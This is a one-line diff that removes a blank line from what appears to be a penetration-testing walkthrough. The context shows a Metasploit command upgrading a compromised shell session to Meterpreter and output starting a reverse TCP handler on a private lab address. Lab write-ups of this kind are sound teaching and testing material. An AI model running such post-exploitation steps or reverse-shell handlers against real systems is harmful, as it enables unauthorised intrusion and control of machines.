@@ -531,7 +531,6 @@ Now, upgrade the session:
 ```bash
 msf5 > sessions -u 1
 [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
-
 [*] Upgrading session ID: 1
 [*] Starting exploit/multi/handler
 [*] Started reverse TCP handler on 10.2.8.137:4433
